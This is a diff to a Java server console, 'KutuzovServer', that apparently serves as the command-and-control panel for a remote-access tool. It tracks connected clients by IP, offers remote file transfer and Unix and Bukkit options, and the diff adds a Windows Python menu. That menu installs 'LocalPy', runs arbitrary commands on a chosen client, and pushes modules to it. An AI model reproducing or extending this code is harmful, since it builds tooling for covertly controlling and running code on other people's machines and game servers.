@@ -10,10 +10,18 @@ import me.kutuzov.packet.bukkit.*;
 import me.kutuzov.packet.kftp.*;
 import me.kutuzov.packet.logger.*;
 import me.kutuzov.packet.logger.types.TokenType;
+import me.kutuzov.packet.python.CSPythonStatusPacket;
 import me.kutuzov.server.client.Client;
 import me.kutuzov.server.client.ClientManager;
 import me.kutuzov.server.kftp.KFTPPanel;
+import me.kutuzov.server.python.PythonClient;
+import me.kutuzov.server.python.PythonClientManager;
+import me.kutuzov.server.python.manager.PythonManager;
+import me.kutuzov.server.python.pmodule.PythonModule;
+import me.kutuzov.server.python.pmodule.PythonModuleInstallable;
+import me.kutuzov.server.python.pmodule.PythonModuleMenu;
 import me.kutuzov.server.util.ActionQueue;
+import me.kutuzov.server.util.ConsoleUtils;
 import me.kutuzov.server.util.LoadingWheel;
 import me.kutuzov.utils.ImageUtils;
 import me.pk2.moodlyencryption.MoodlyEncryption;
@@ -40,7 +48,10 @@ import static me.kutuzov.server.KutuzovEnvironment.*;
 import static me.kutuzov.server.util.ConsoleUtils.*;
 
 public class KutuzovServer {
+    public static boolean menu_gomain = false;
     public final ClientManager clientManager;
+    public final PythonManager pythonManager;
+    public final PythonClientManager pythonClientManager;
     public final ActionQueue actionQueue;
     private final LoadingWheel loadingWheel;
     private ServerSocket serverSocket;
@@ -49,6 +60,8 @@ public class KutuzovServer {
     public KutuzovServer() {
         this.loadingWheel = new LoadingWheel();
         this.clientManager = new ClientManager();
+        this.pythonManager = new PythonManager();
+        this.pythonClientManager = new PythonClientManager();
         this.actionQueue = new ActionQueue();
     }
 
@@ -130,15 +143,24 @@ public class KutuzovServer {
         checkThreadLoop = new Thread(() -> {
             while(true) {
                 trySleep(5000);
-                for (Map.Entry<String, Client> entry : clientManager.clients.entrySet())
+                for (Map.Entry<String, Client> entry : clientManager.clients.entrySet()) {
+                    if(System.currentTimeMillis() - entry.getValue().lastMS.get() > 10000) {
+                        clientManager.clients.remove(entry.getKey());
+                        pythonClientManager.clients.remove(entry.getKey());
+                        continue;
+                    }
+
                     asyncRun(() -> entry.getValue().add(() -> {
                         try {
                             entry.getValue().sendPacket(new SCKeepAlivePacket());
+                            entry.getValue().lastMS.set(System.currentTimeMillis());
                         } catch (Exception e) {
                             clientManager.clients.remove(entry.getKey());
+                            pythonClientManager.clients.remove(entry.getKey());
                             // pnl("Client disconnected(" + clientManager.clients.size() + "): " + entry.getKey());
                         }
                     }));
+                }
             }
         });
         checkThreadLoop.start();
@@ -539,7 +561,7 @@ public class KutuzovServer {
         }
     }
 
-    private void user_list_header(Client client) {
+    public void user_list_header(Client client) {
         pnl("CLIENT VERSION: " + client.getVersion());
         pnl("ID: " + client.getIdentifierName());
         pnl("IP: " + client.getIp().substring(0, client.getIp().indexOf(':')));
@@ -966,6 +988,105 @@ public class KutuzovServer {
         user_list_client_bukkit(client);
     }
 
+    public void user_list_client_header_python(PythonClient python) {
+        pnl("Python: " + python.installed);
+        pnl("PyPath: " + python.path);
+    }
+
+    private void user_list_client_python_modules(PythonClient python) {
+        clearConsole();
+
+        pnl("Fetching info...");
+        python.update();
+
+        clearConsole();
+        user_list_header(python.client);
+        user_list_client_header_python(python);
+        pnl("Modules: ");
+        for(String key : KutuzovEntry.SERVER.pythonManager.modules.keySet()) {
+            PythonModule<?> module = KutuzovEntry.SERVER.pythonManager.modules.get(key);
+            if(module instanceof PythonModuleInstallable) {
+                PythonModuleInstallable installable = (PythonModuleInstallable)module;
+                python.client.addWait(() -> {
+                    pwl("  - " + key);
+                    pnl(" [" + (installable.isInstalled(python)?"Installed":"Not installed") + "]");
+                });
+            }
+        }
+
+        while(true) {
+            pwl("Module: ");
+            String input = readLine();
+            if(input.equals("exit"))
+                break;
+            if(!KutuzovEntry.SERVER.pythonManager.modules.containsKey(input)) {
+                pnl("** Module not found!");
+                continue;
+            }
+
+            PythonModule<?> module = KutuzovEntry.SERVER.pythonManager.modules.get(input);
+            if(!(module instanceof PythonModuleInstallable)) {
+                pnl("** Module is not installable!");
+                continue;
+            }
+
+            if(module instanceof PythonModuleMenu) {
+                PythonModuleMenu menu = (PythonModuleMenu)module;
+                menu.menu(python);
+                break;
+            }
+
+            module.run(python.client);
+            break;
+        }
+    }
+
+    private void user_list_client_python(Client client) {
+        clearConsole();
+        pnl("Fetching info...");
+
+        client.actionQueue.getQueue().clear();
+        PythonClient python = KutuzovEntry.SERVER.pythonClientManager.cache(client);
+        python.update();
+
+        clearConsole();
+        user_list_header(client);
+        user_list_client_header_python(python);
+        pnl("Options: ");
+        pnl("  0) Go back");
+        pnl("  1) Update");
+        pnl("  2) Install LocalPy");
+        pnl("  3) Run command");
+        pnl("  4) Modules");
+        pwl("Option: ");
+        String input = readLine();
+        int option = input.contentEquals("")?-1:Integer.parseInt(input);
+        switch (option) {
+            case 0:
+                return;
+            case 1:
+                python.update();
+                break;
+            case 2:
+                clearConsole();
+                pythonManager.getModule("install").run(client);
+                menu_gomain = true;
+                return;
+            case 3:
+                clearConsole();
+                pythonManager.getModule("command").run(client);
+                break;
+            case 4:
+                clearConsole();
+                user_list_client_python_modules(python);
+                break;
+            default:
+                break;
+        }
+
+        user_list_client_python(client);
+    }
+
     private void user_list_client(Client client) {
         clearConsole();
         user_list_header(client);
@@ -979,6 +1100,7 @@ public class KutuzovServer {
         pnl("  6) KFTP(Kutuzov's File Transfer Protocol)");
         pnl("  7) Unix only options");
         pnl("  8) Bukkit only options");
+        pnl("  9) Python [Windows]");
         pwl("Option: ");
         String input = readLine();
         int option = input.contentEquals("")?-1:Integer.parseInt(input);
@@ -1039,6 +1161,12 @@ public class KutuzovServer {
                 user_list_client_bukkit(client);
                 break;
 
+            case 9:
+                user_list_client_python(client);
+                if(menu_gomain)
+                    return;
+                break;
+
             case 0:
                 menu();
                 return;
@@ -1066,6 +1194,7 @@ public class KutuzovServer {
         }
 
         user_list_client(client);
+        menu_gomain = false;
     }
 
 
